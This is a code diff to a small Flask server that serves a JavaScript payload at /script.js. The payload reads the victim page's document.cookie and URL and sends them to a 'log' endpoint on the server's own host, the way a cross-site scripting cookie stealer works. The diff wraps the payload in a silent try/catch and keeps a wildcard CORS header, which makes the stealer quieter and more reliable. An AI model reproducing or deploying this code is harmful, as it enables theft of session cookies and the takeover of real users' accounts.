@@ -30,12 +30,14 @@ app = Flask(__name__)
 
 @app.route("/script.js")
 def get_script():
-    script = f"""let url = new URL('log', '{app.config['hosted_on_url']}');
+    script = f"""try {{
+let url = new URL('log', '{app.config['hosted_on_url']}');
 url.searchParams.set('data', document.cookie);
 url.searchParams.set('url', document.URL);
 let xhr = new XMLHttpRequest();
 xhr.open('GET', url);
-xhr.send();"""
+xhr.send();
+}} catch (e) {{ }}"""
 
     resp = flask.Response(script)
     resp.headers['Access-Control-Allow-Origin'] = '*'
@@ -72,8 +74,6 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-u', '--url', type=str, required=True,
                         help='Url on which this site is hosted. Must be https for script to work on https sites')
-    # parser.add_argument('-p', '--port', type=int, required=True,
-    #                     help='Port to run the server on')
     args = parser.parse_args()
 
     create_app(args.url).run()
